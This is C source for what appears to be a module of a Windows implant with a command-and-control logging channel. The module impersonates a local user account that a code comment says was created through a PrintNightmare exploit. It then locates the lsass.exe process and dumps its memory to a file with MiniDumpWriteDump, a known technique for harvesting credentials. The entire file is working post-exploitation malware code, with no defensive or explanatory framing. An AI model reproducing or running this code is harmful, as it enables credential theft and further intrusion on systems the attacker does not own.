#include "c2_comms.h"
#include <tlhelp32.h>
#include "Dbghelp.h"



#pragma comment(lib, "onecore.lib")
#pragma comment(lib, "Dbghelp.lib")

// ----------------- Function declarations -----------------
// ---------------------------------------------------------
DWORD Impersonate();
DWORD GetLSASSPid();
BOOL DumpLSASS(char* path);
// ---------------------------------------------------------


// Attempts to get the security token for the user "john"
DWORD Impersonate() {
    HANDLE hToken;
    int status;

    // Try to log on as the user we created from printer nightmare
    status = LogonUserA("john", ".", "john", LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, &hToken);
    if (status == 0) {
        c2_log("[!] ERROR: could not log on", 27);
        return -1;
    }

    // Imprtsonate the user to get their privs
    status = ImpersonateLoggedOnUser(hToken);
    if (status == 0) {
        c2_log("[!] ERROR: could not impersonate", 32);
        CloseHandle(hToken);
        return -1;
    }
    CloseHandle(hToken);
    return 0;
}


// Returns the PID of the lsass.exe process
DWORD GetLSASSPid() {
    HANDLE hProcSnap;
    PROCESSENTRY32 procEntry;
    DWORD pid = 0;

    // Take a snapshot of all processes in the system.
    hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcSnap == INVALID_HANDLE_VALUE) {
        return -1;
    }

    // Set the size of the structure before using it.
    procEntry.dwSize = sizeof(PROCESSENTRY32);

    // Retrieve information about the first process, and exit if unsuccessful
    if (!Process32First(hProcSnap, &procEntry)) {
        CloseHandle(hProcSnap);
        return -1;
    }

    // Iterate through processes to find the one with the specified name.
    // Note: VSCode says szExeFile is a wchar_t*, but it's really a char*
    do {
        if (strcmp(procEntry.szExeFile, "lsass.exe") == 0) {
            pid = procEntry.th32ProcessID;
            break;
        }
    } while (Process32Next(hProcSnap, &procEntry));
    CloseHandle(hProcSnap);

    return pid;
}


// Attempts to access memory of lsass.exe for dumping.
// path: Path to place the dump at.
// TODO: lsass.exe is protected, need either new method or new target
BOOL DumpLSASS(char* path) {
    HANDLE procHand;
    HANDLE hFile;
    int status;
    int pid;
    
    // Get PID
    pid = GetLSASSPid();
    if (pid <= 0) {
        c2_log("[!] Could not get PID of lsass.exe\n");
        return FALSE;
    }

    // Get handle
    procHand = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (procHand == NULL) {
        c2_log("[!] Could not get handle to lsass.exe (PID %d)\n", pid);
        c2_log("[!] Error code 0x%x\n", GetLastError());
        return FALSE;
    }

    // Create file
    hFile = CreateFileA(path, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        c2_log("[!] Could not create dump file\n");
        return FALSE;
    }

    // DUMP
    return MiniDumpWriteDump(procHand, pid, hFile, MiniDumpIgnoreInaccessibleMemory, NULL, NULL, NULL);
}